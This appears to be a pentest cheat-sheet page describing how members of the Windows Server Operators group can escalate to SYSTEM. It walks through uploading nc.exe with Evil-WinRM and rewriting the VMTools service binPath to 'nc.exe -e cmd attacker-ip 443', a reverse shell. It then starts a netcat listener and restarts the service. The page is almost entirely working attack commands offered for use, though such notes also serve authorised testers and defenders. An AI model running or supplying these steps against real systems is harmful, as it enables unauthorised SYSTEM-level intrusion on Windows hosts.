---
icon: server
---

# Server Operators Abuse

#### Members can start/stop services and modify service binPath.

**Requirement:** Member of Server Operators group

```bash
# Detect — check group membership
whoami /groups | findstr "Server Operators"
net group "Server Operators" /domain
```

```powershell
# Step 1 — Upload nc.exe to victim
# Evil-WinRM
upload /usr/share/windows-binaries/nc.exe

# Step 2 — List services you can modify
services

# Step 3 — Modify binPath of a service
sc.exe config VMTools binPath="C:\\Users\\test\\Documents\\nc.exe -e cmd attacker-ip 443"
```

```bash
# Step 4 — Listener on Linux
rlwrap -cAr nc -nlvp 443
```

```powershell
# Step 5 — Restart service
sc.exe stop VMTools
sc.exe start VMTools
# Shell comes back as NT AUTHORITY\\SYSTEM
```

***
